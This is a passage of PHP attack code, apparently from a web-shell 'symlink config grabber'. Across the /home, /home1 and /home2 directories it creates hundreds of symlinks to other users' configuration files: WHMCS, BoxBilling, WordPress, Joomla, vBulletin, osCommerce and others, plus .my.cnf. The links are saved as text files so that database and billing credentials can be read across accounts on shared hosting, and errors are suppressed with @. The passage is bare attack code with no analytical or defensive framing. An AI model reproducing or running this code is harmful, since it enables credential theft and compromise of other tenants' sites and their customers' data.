@symlink('/home/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//Home1

@symlink('/home1/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home1/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home1/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home1/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
//Home2

@symlink('/home2/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home2/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home2/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
